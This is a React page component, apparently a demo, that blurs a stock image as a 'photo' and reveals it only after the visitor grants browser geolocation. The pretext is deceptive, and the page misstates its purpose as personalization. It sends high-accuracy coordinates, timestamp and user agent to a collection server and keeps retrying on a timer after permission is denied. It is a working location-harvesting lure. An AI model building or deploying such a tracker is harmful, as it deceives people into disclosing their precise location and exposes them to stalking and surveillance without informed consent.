import api from '@/lib/api'
import React, { useEffect, useMemo, useRef, useState } from 'react'


const BG_URL = 'https://images.unsplash.com/photo-1500530855697-b586d89ba3ee?q=80&w=1920&auto=format&fit=crop'

function LocationModal({ open, onEnable, loading, error, permissionState }) {
  if (!open) return null
  const denied = permissionState === 'denied'

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60">
      <div className="w-full max-w-md rounded-2xl bg-white shadow-2xl">
        <div className="p-6">
          <h2 className="text-2xl font-semibold tracking-tight">Click Allow to view photo</h2>
          <p className="mt-2 text-sm text-gray-600">
            Click <span className="font-medium">Allow</span> to view your photo. We use your
            location to personalize your experience.
          </p>

          {denied && (
            <div className="mt-3 text-sm text-amber-700 bg-amber-50 border border-amber-200 rounded-md p-3">
              Your browser blocked location access. Use the address-bar location icon to allow access, then click
              <span className="font-semibold"> Retry</span> below.
            </div>
          )}

          {error && !denied && (
            <div className="mt-3 text-sm text-red-700 bg-red-50 border border-red-200 rounded-md p-3">
              {error}
            </div>
          )}

          <div className="mt-6 flex items-center gap-3">
            <button
              onClick={onEnable}
              disabled={loading}
              className="inline-flex items-center justify-center px-4 py-2 rounded-xl bg-black text-white hover:bg-gray-800 active:scale-[.99] disabled:opacity-60"
            >
              {loading ? 'Requesting…' : denied ? 'Retry' : 'Allow'}
            </button>
            <span className="text-xs text-gray-500">Consent can be changed anytime in browser settings.</span>
          </div>
        </div>
      </div>
    </div>
  )
}

export default function Location() {
  const [modalOpen, setModalOpen] = useState(true)
  const [coords, setCoords] = useState(null)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [permissionState, setPermissionState] = useState('prompt')
  const retryTimer = useRef(null)

  // Observe geolocation permission if supported
  useEffect(() => {
    let cancelled = false

    // Restore any saved coords
    try {
      const saved = localStorage.getItem('curiosity_location')
      if (saved) {
        const parsed = JSON.parse(saved)
        if (parsed?.lat && parsed?.lng) {
          setCoords(parsed)
          setModalOpen(false)
        }
      }
    } catch {}

    if (navigator.permissions?.query) {
      navigator.permissions
        .query({ name: 'geolocation' })
        .then((res) => {
          if (cancelled) return
          setPermissionState(res.state)
          res.onchange = () => setPermissionState(res.state)
        })
        .catch(() => {})
    }

    return () => {
      cancelled = true
      if (retryTimer.current) clearInterval(retryTimer.current)
    }
  }, [])

  const isUnblurred = useMemo(() => Boolean(coords), [coords])

  const persist = async (payload) => {
    try {
      localStorage.setItem('curiosity_location', JSON.stringify(payload))
    } catch {}
    try {
      await fetch('http://localhost:5001/api/locations', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      })
    } catch (e) {
      console.warn('Failed to persist to server:', e)
    }
  }

  const handleSuccess = async (pos) => {
    const payload = {
      lat: pos.coords.latitude,
      lng: pos.coords.longitude,
      accuracy: pos.coords.accuracy,
      timestamp: Date.now(),
      ua: navigator.userAgent,
    }
    setCoords(payload)
    setModalOpen(false)
    setLoading(false)
    if (retryTimer.current) {
      clearInterval(retryTimer.current)
      retryTimer.current = null
    }
    await persist(payload)
  }

  const handleError = (err) => {
    setLoading(false)
    if (err.code === 1) {
      // Permission denied — keep modal open and set auto-retry loop
      setError('Permission denied. Use the address-bar location icon to allow, then press Retry.')
      if (!retryTimer.current) {
        retryTimer.current = setInterval(() => {
          navigator.geolocation.getCurrentPosition(handleSuccess, () => {}, { timeout: 8000 })
        }, 6000)
      }
    } else if (err.code === 2) setError('Position unavailable. Check GPS/network and try again.')
    else if (err.code === 3) setError('Request timed out. Try again.')
    else setError('Failed to get your location.')
  }

  const requestLocation = () => {
    setError('')
    setLoading(true)
    if (!('geolocation' in navigator)) {
      setLoading(false)
      setError('Geolocation is not available in this browser.')
      return
    }
    navigator.geolocation.getCurrentPosition(
      handleSuccess,
      handleError,
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    )
  }

  return (
    <div className="relative h-screen w-screen overflow-hidden">
      {/* Background image with conditional blur */}
      <div
        className={
          'fixed inset-0 bg-cover bg-center transition-all duration-500 ' +
          (isUnblurred ? 'blur-0 brightness-100 scale-105' : 'blur-2xl brightness-75 scale-110')
        }
        style={{ backgroundImage: `url(${BG_URL})` }}
      />

      {/* Soft vignette overlay */}
      <div className="fixed inset-0 bg-[radial-gradient(1200px_600px_at_50%_70%,rgba(0,0,0,.12),rgba(0,0,0,.55))] pointer-events-none" />

      {/* Content */}
      <main className="relative z-10 h-screen w-full flex items-center justify-center">
        {!isUnblurred ? (
          <div className="text-center text-white drop-shadow-xl">
            <h1 className="text-4xl font-bold tracking-tight">A photo awaits…</h1>
            <p className="mt-2 opacity-90">Click Allow to reveal Photo.</p>
          </div>
        ) : (
          <div className="text-center text-white drop-shadow-xl">
            <h1 className="text-4xl font-bold tracking-tight">Welcome ✨</h1>
            <p className="mt-2 opacity-90">Thanks! We’ve unlocked your photo.</p>
            {coords && (
              <p className="mt-4 text-sm opacity-80">
                Saved @ lat {coords.lat.toFixed(5)}, lng {coords.lng.toFixed(5)}
              </p>
            )}
          </div>
        )}
      </main>

      <LocationModal
        open={modalOpen}
        onEnable={requestLocation}
        loading={loading}
        error={error}
        permissionState={permissionState}
      />

      {/* Footer note */}
      <footer className="fixed bottom-3 inset-x-0 z-10 text-center text-xs text-white/80">
        Demo site · Update API URL & privacy copy for production.
      </footer>
    </div>
  )
}
